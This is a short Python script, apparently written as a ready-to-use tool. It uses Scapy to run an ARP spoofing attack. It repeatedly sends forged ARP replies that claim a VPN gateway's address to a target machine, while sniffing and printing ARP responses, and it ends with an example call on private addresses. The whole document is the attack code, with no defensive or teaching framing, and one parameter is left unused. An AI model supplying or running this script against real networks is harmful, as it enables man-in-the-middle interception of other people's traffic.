from scapy.all import *
import time
import threading

def arp_spoof(target_ip, target_mac, spoof_ip, vpn_gateway_ip):
    # create an ARP packet
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=vpn_gateway_ip)

    # create a thread to send the packet repeatedly
    def send_packet():
        while True:
            send(arp_packet)
            time.sleep(1)

    thread = threading.Thread(target=send_packet)
    thread.start()

    # capture incoming packets
    def capture_packet(packet):
        # if the packet is an ARP response, print the sender's IP and MAC address
        if ARP in packet and packet[ARP].op == 2:
            sender_ip = packet[ARP].psrc
            sender_mac = packet[ARP].hwsrc
            print("IP:", sender_ip, "MAC:", sender_mac)

    sniff(prn=capture_packet)

# example usage
arp_spoof("192.168.0.10", "00:11:22:33:44:55", "192.168.0.100", "10.0.0.1")